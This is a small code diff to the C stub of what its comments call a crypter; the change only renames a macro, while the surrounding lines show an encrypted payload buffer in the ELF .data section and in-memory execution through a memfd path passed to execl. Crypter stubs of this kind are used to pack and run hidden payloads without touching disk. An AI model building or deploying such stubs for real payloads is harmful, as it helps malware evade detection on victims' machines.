@@ -9,7 +9,7 @@
 #include "elf_utils.h"
 
 #define IN_MEMORY_FILE_NAME "myfile"
-#define EXECUTABLE_NAME "stub_test"
+#define PROCESS_NAME "stub_test"
 
 // Used to allocate space in the ELF .data section, so we need to initialize it.
 // This buffer will be replaced with the encrypted payload by the crypter
@@ -61,7 +61,7 @@ int main(void)
 	sprintf(memfd_path, "/proc/%d/fd/%d", getpid(), memfd);
 
 	printf("RUNNING...\n\n");
-	execl(memfd_path, EXECUTABLE_NAME, NULL);
+	execl(memfd_path, PROCESS_NAME, NULL);
 
 	return 0;
 }
